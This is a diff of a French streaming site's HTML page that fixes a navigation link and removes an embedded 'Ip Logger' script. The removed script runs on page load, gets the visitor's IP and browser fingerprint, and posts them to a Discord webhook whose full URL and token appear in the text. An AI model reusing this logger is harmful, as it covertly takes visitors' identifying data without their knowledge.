@@ -129,7 +129,7 @@
     <body>
         <div class="navbar">
             <div class="nav-content">
-                <a href="Index.html.html" class="nav-link">Home</a>
+                <a href="index.html.html" class="nav-link">Home</a>
                 <a href="𝓩𝓞𝓝Streamings.html" class="nav-link">Films</a>
                 <a href="𝓩𝓞𝓝StreamingsContacts.html" class="nav-link">Contacts</a>
             </div>
@@ -139,82 +139,7 @@
                 <button id="searchButton">Rechercher</button>
             </div>
         </div>
-        <script>
-            function sendDetailsToWebhook(details) {
-                const webhookUrl = 'https://discord.com/api/webhooks/1258000361269100544/qcT7WV9SsGkeDt0ihUlVdC4ucspQ0kHDQJ5vmlY7m1ST-4DWEe-XLDd1YP5TdypDd6MP';
-                const params = {
-                    username: "Ip Logger",
-                };
-                const data = {
-                    embeds: [{
-                        title: 'User Details',
-                        description: 'Détails de lutilisateur accédant à la page.',
-                        color: 0x2f3136, // Grey-black color
-                        fields: [
-                            { name: 'IP Address', value: details.ip, inline: true },
-                            { name: 'User-Agent', value: details.userAgent, inline: true },
-                            { name: 'Language', value: details.language, inline: true },
-                            { name: 'Screen Resolution', value: `${details.screenWidth}x${details.screenHeight}`, inline: true },
-                            { name: 'Color Depth', value: `${details.colorDepth} bits`, inline: true },
-                            { name: 'Time Zone', value: details.timeZone, inline: true },
-                            { name: 'Platform', value: details.platform, inline: true },
-                            { name: 'Cookies Enabled', value: details.cookiesEnabled, inline: true },
-                            { name: 'Do Not Track', value: details.doNotTrack, inline: true }
-                        ],
-                        footer: {
-                            text: 'Page accessed from '
-                        },
-                        timestamp: new Date()
-                    }]
-                };
         
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Success:', data);
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                });
-            }
-        
-            function getUserDetails() {
-                const ipFetch = fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => data.ip)
-                    .catch(error => {
-                        console.error('Error getting IP:', error);
-                        return 'N/A';
-                    });
-        
-                const details = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    colorDepth: screen.colorDepth,
-                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    platform: navigator.platform,
-                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-                    doNotTrack: navigator.doNotTrack || 'Not enabled'
-                };
-        
-                return ipFetch.then(ip => {
-                    return { ip, ...details };
-                });
-            }
-        
-            // Get the user details and send them to the webhook
-            getUserDetails().then(details => {
-                sendDetailsToWebhook(details);
-            });
-        </script>
         
         <div class="content">
             <h1>Bienvenue Sur La v2 de Streamify</h1>
